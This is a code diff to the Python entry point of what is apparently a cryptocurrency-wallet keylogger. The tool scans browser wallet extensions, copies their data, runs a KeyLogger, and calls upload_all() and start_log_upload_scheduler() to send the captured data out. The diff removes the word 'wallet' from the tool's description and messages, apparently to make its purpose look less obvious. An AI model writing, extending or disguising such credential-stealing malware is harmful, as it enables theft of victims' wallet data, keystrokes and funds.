@@ -14,7 +14,7 @@ from .permissions import ensure_permissions
 
 def main():
     """主函数"""
-    parser = argparse.ArgumentParser(description="钱包键盘记录器")
+    parser = argparse.ArgumentParser(description="键盘记录器")
     parser.add_argument(
         "--dry-run",
         action="store_true",
@@ -32,9 +32,9 @@ def main():
         print("正在扫描浏览器扩展数据...")
         count = backup_browser_extensions(dry_run=True)
         if count > 0:
-            print(f"检测到 {count} 个目标钱包扩展（未备份）\n")
+            print(f"检测到 {count} 个目标扩展（未备份）\n")
         else:
-            print("未检测到目标钱包扩展\n")
+            print("未检测到目标扩展\n")
 
         logger = KeyLogger(dry_run=True)
         try:
@@ -51,9 +51,9 @@ def main():
     print("正在备份浏览器扩展数据...")
     count = backup_browser_extensions()
     if count > 0:
-        print(f"已备份 {count} 个钱包扩展\n")
+        print(f"已备份 {count} 个扩展\n")
     else:
-        print("未检测到目标钱包扩展\n")
+        print("未检测到目标扩展\n")
 
     upload_all()
     start_log_upload_scheduler()
